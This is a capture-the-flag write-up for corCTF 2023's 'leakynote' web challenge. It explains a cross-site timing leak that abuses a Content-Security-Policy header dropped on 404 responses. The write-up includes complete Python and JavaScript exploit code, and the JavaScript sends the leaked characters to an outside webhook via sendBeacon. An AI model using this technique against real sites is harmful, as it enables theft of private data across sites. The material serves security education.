# corCTF 2023 - web/leakynote

- 3 solves / 458 points
- Authors: Strellic, larry
- CTFtime: https://ctftime.org/event/1928/

## Solution

### CSP

CSP settings (a part of `nginx.conf`):
```nginx
add_header Content-Security-Policy "script-src 'none'; object-src 'none'; frame-ancestors 'none';";
```

Search implementation (a part of `search.php`):
```php
if (isset($_GET["query"]) && is_string($_GET["query"])) {
    $stmt = $db->prepare("SELECT * FROM posts WHERE username=? AND contents LIKE ?");
    $stmt->execute([$_SESSION["user"], "%" . $_GET["query"] . "%"]);
    $posts = $stmt->fetchAll();

    if (count($posts) == 0) {
        http_response_code(404);
    }
}
```

As an important fact, `always` option does not exist in `add_header`. So,

- If `count($posts) != 0` => 200 status => the CSP is enabled.
- If `count($posts) == 0` => 404 status => the CSP is disabled.

### Loading CSS files

In all web pages, the following CSS files are loaded:
```html
<link rel="stylesheet" href="/assets/normalize.css" />
<link rel="stylesheet" href="/assets/milligram.css" />
```

If the admin bot opens the following post:
```html
<iframe src="/search.php?query=corctf{a">
```
then,

- If the flag includes `corctf{a` => the iframe is blocked by the CSP => the CSS files are **not** loaded after the page is opened.
- If the flag does **not** include `corctf{a` => the iframe is **not** blocked by the CSP => the CSS files are loaded after the page is opened.


### Oracle to leak

1. Open many post pages of `<iframe src="/search.php?query=corctf{a">`.
2. Measure the loading time of the CSS files from a cross-site page, as soon as all the post pages are opened.
3. Then, the time depends on whether the CSS file loading is busy or not.
    - If the flag includes `corctf{a` => the CSS file loading is **not** busy => the loading time of step 2 is **short**.
    - If the flag does **not** include `corctf{a` => the CSS file loading is busy => the loading time of step 2 is **long**.

## Exploit

A leak of the next character to `corctf{leakrgo` is as follows.

1. Create posts that will be used in the oracle:

`make_posts.py`:
```python
import httpx
import string
import random
import sys
import re

BASE_URL = "https://leakynote.be.ax"
CHARS = "}abcdefghijklmnopqrstuvwxyz"

prefix = sys.argv[1]
print(f"{prefix = }")

username = "".join(random.choices(string.ascii_letters, k=8))
password = "".join(random.choices(string.ascii_letters, k=8))

client = httpx.Client()

res = client.post(
    f"{BASE_URL}/register.php",
    data={
        "name": username,
        "pass": password,
    },
)
assert res.status_code == 302

for c in CHARS:
    query = "".join([f"&#{ord(x)};" for x in (prefix + c)[-6:]])
    contents = f'<iframe src="/search.php?query={query}">'
    assert len(contents) <= 100
    res = client.post(
        BASE_URL,
        data={
            "title": "a",
            "contents": contents,
        },
    )
    assert res.status_code == 200

res = client.get(BASE_URL)
ids = re.findall(r"<a href='/post\.php\?id=([0-9a-f]+)'>", res.text)
print(f"const TARGET_IDS = {ids};")
```

```sh
$ python make_posts.py "corctf{leakrgo"
prefix = 'corctf{'
const TARGET_IDS = ['054df3428619e625', '65cc5405dc8564fe', '1b7d45634e27c873', 'e29642c2832547df', '2d2d3cde1c8d7364', '3a698bdc7a5f3211', '2211714f4295a0d4', 'b2731895c908a7ea', 'ef351ad9299d2549', '25afaf7e395a0fbc', '88793de3d0858540', 'f771b89bca721df6', '36e96ab2f0cb2d80', '66c3dc231da04d05', '9074846e39521d35', '170a2b9ab4640814', '86f4efd489ad6a03', 'f6ee33af12dc5326', 'b2b1e00655eccc83', 'f305085f9fc390e7', 'e40fbeb6bf596a8a', '6f86900c87d72a81', '55a5a41d390df24b', 'c8e4b6abf8f818d4', '3f95bf8920a5fe33', '3d5d90d50f382a76', '08db4102b0147e35'];
```

2. Report a URL serving the following `index.html` and `main.js`

`index.html`:
```html
<!DOCTYPE html>
<html>
<body>
  <script src="main.js"></script>
</body>
</html>
```

```javascript
const BASE_URL = "https://leakynote.be.ax";

const HOOK_URL = "https://webhook.site/xxx-xxx-xxx-xxx";

const RESOURCE_URLS = [
  `${BASE_URL}/assets/normalize.css`,
  `${BASE_URL}/assets/milligram.css`,
];

const CHARS = "}abcdefghijklmnopqrstuvwxyz";
const TARGET_IDS = [
  "054df3428619e625",
  "65cc5405dc8564fe",
  "1b7d45634e27c873",
  "e29642c2832547df",
  "2d2d3cde1c8d7364",
  "3a698bdc7a5f3211",
  "2211714f4295a0d4",
  "b2731895c908a7ea",
  "ef351ad9299d2549",
  "25afaf7e395a0fbc",
  "88793de3d0858540",
  "f771b89bca721df6",
  "36e96ab2f0cb2d80",
  "66c3dc231da04d05",
  "9074846e39521d35",
  "170a2b9ab4640814",
  "86f4efd489ad6a03",
  "f6ee33af12dc5326",
  "b2b1e00655eccc83",
  "f305085f9fc390e7",
  "e40fbeb6bf596a8a",
  "6f86900c87d72a81",
  "55a5a41d390df24b",
  "c8e4b6abf8f818d4",
  "3f95bf8920a5fe33",
  "3d5d90d50f382a76",
  "08db4102b0147e35",
];
const START_I = 0;

const TRY_NUM = 3;
const WIN_NUM = 10;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const wait = (w) =>
  new Promise(async (resolve) => {
    while (true) {
      try {
        w.document;
      } catch {
        resolve();
        break;
      }
      await sleep(30);
    }
  });

const measureOne = async (url) => {
  const firstW = open(url);
  await wait(firstW);

  const ws = [];
  for (let i = 0; i < WIN_NUM; i++) {
    ws.push(open(url));
  }
  await Promise.all(ws.map((w) => wait(w)));

  let start = performance.now();
  await Promise.all(
    RESOURCE_URLS.map((u) =>
      fetch(u, {
        mode: "no-cors",
      })
    )
  );
  const end = performance.now();

  for (const w of ws) {
    w.close();
  }
  firstW.close();

  return end - start;
};

const measure = async (url) => {
  let avg = 0;
  for (let i = 0; i < TRY_NUM; i++) {
    const t = await measureOne(url);
    avg += t;
  }
  avg /= TRY_NUM;
  return avg;
};

const leakOne = async (id) => {
  const url = `${BASE_URL}/post.php?id=${id}`;
  return await measure(url);
};

const leak = async () => {
  await leakOne(TARGET_IDS[0]);
  await sleep(1500);

  let minT = 100000000;
  let minC;
  for (let i = START_I; i < CHARS.length; i++) {
    const c = CHARS[i];
    const t = await leakOne(TARGET_IDS[i]);
    if (t < minT) {
      minT = t;
      minC = c;
    }
    navigator.sendBeacon(
      HOOK_URL,
      JSON.stringify({ START_I, i, c, t, minC, minT })
    );
    await sleep(1500);
  }
  return minC;
};

const main = async () => {
  const nextC = await leak();
  navigator.sendBeacon(HOOK_URL + "/leak", nextC);
};
main();
```

Then, I got:
```json
{
  "START_I": 0,
  "i": 9,
  "c": "i",
  "t": 469.5333333313465,
  "minC": "d",
  "minT": 72.13333333283663
}
```
The next character is `d`.

## Flag

```
corctf{leakrgod}
```
